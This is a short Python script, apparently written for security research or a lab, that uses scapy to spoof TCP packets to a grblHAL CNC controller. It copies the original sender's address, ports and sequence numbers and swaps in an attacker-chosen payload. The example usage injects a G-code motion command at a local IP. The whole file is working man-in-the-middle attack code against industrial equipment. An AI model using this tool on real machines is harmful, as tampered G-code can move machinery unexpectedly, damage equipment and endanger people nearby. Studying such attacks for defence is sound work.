"""
spoofer.py - TCP Packet Spoofer for G-Code
Author: luke pepin
Description: Modifies and forwards TCP packets to the grblHAL machine, recalculating checksums.
"""

from scapy.all import IP, TCP, send

def spoof_and_forward(packet, new_payload, dst_ip, dst_mac):
    """
    Modifies the payload of a TCP packet and forwards it to the destination IP/MAC.
    Recalculates checksums automatically.
    """
    ip_layer = packet[IP]
    tcp_layer = packet[TCP]
    spoofed_packet = IP(src=ip_layer.src, dst=dst_ip) / \
                    TCP(sport=tcp_layer.sport, dport=tcp_layer.dport, seq=tcp_layer.seq, ack=tcp_layer.ack, flags=tcp_layer.flags) / \
                    new_payload
    send(spoofed_packet, verbose=False)
    print(f"[+] Spoofed and forwarded packet to {dst_ip}")

# Example usage:
# spoof_and_forward(packet, b'G01 X10.0 Y25.0 Z-1.0 F1000', '192.168.1.20', 'AA:BB:CC:DD:EE:02')
